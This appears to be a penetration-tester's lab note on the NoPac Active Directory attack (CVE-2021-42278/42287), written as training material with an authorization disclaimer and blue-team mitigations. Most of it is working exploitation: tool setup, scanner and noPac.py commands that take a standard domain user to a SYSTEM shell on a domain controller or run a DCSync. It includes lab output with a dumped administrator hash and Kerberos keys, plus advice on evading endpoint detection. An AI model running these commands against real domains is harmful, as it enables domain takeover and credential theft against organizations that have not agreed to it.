This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)

Authorized use only on systems you own or have explicit written permission to test.

## TL;DR

- “NoPac” = chaining two 2021 bugs to jump from any **domain user** to **Domain Admin** in one shot.
    
- CVE-2021-42278: lets you spoof a **computer account’s** `sAMAccountName` (SAM bypass).
    
- CVE-2021-42287: Kerberos **PAC** confusion issues TGS for the **closest matching name** (can become DC).
    
- Attack flow (default, unpatched AD): add machine → rename its `sAMAccountName` to match a DC → request tickets → get DC privileges → SYSTEM on DC or DCSync.
    

---

## What the two CVEs do

- **42278 (SAM bypass)**: Standard users can add machine accounts; spoof the machine’s `sAMAccountName` to match a DC.
    
- **42287 (Kerberos PAC)**: When you request a TGS, KDC may issue it to the nearest match (the spoofed DC name), granting DC-level rights.
    

Key dependency: `ms-DS-MachineAccountQuota` > 0 (default **10**) lets authenticated users add machine accounts.

---

## Preconditions & Notes

- Any **domain user** creds.
    
- Target DC unpatched for 42278/42287.
    
- `ms-DS-MachineAccountQuota` ≥ 1 (if set to **0**, this path is blocked).
    
- Network path to the DC (`-dc-ip`, `-dc-host` consistent).
    
- Tooling in place: **Impacket** + **noPac** repo.
    

---

## Setup (as provided)

```bash
# Install Impacket (example)
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install

# Clone NoPac
git clone https://github.com/Ridter/noPac.git
```

---

## Check Vulnerability - Scanning for NoPac

Scanner uses a standard user to request tickets and reports quota:
```shell-session
z3tssu@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

---

## Exploitation Options 

### A) Get SYSTEM Shell on DC (semi-interactive via smbexec)

```bash
z3tssu@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
  -shell --impersonate administrator -use-ldap
```

What happens:

- Adds a machine account, spoofs `sAMAccountName` to DC, obtains TGT/TGS, impersonates `administrator`.
    
- Drops a semi-interactive **smbexec.py** shell as **NT AUTHORITY\SYSTEM** on the DC.
    
- Shell is “exact path” only (no `cd` convenience).
    

#### Confirming the Location of Saved Tickets

- NoPac saves ccache tickets in the current dir:
    

```bash
ls
# administrator_DC01.INLANEFREIGHT.local.ccache, ...
```

### Using noPac to DCSync the Built-in Administrator Account

```bash
z3tssu@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
  -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
  --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

- Uses secretsdump via DRSUAPI under the hood.
    
- Outputs NT hash and Kerberos keys for the specified account.
    
- ccache file is created on disk; track and clean up.
    

---

## OPSEC / EDR Considerations

- **smbexec.py** behavior is noisy:
    
    - Creates services like `BTOBTO` / `BTOBO`.
        
    - Writes and runs temporary `execute.bat` per command.
        
    - Windows Defender commonly flags this pattern (e.g., `VirTool:Win32/MSPSEexecCommand`).
        
- If stealth matters, avoid smbexec-style shells; choose quieter post-ex paths permitted by your ROE.
    

---

## Cleanup & Caution

- The tool attempts to restore the spoofed name and delete the temporary machine account; deletion may fail depending on rights.
    
- Remove any leftover **machine accounts** and local **ccache** tickets.
    
- Keep `-dc-ip` and `-dc-host` aligned; mismatch breaks the flow.
    

---

## Mitigations (Blue Team)

- Patch for CVE-2021-42278 / CVE-2021-42287.
    
- Set `ms-DS-MachineAccountQuota = 0` unless machine self-join is required.
    
- Alert on:
    
    - Computer account `sAMAccountName` changes near DC names.
        
    - Sudden machine-account adds/removes by ordinary users.
        
    - Abnormal Kerberos service tickets for DC SPNs.
        
    - New/odd services on DC (smbexec patterns), temporary batch files.
        

---

## Quick Checklist

- [ ]  Confirm `MachineAccountQuota` and patch status.
    
- [ ]  Run `scanner.py` with standard user → vulnerable?
    
- [ ]  Execute `noPac.py` for shell **or** `-dump` for DCSync (as permitted).
    
- [ ]  Capture artifacts (ccache), document hashes/keys per ROE.
    
- [ ]  Clean up: machine account, tickets, temp files.
    
- [ ]  Report: findings, impact, and mitigation steps.
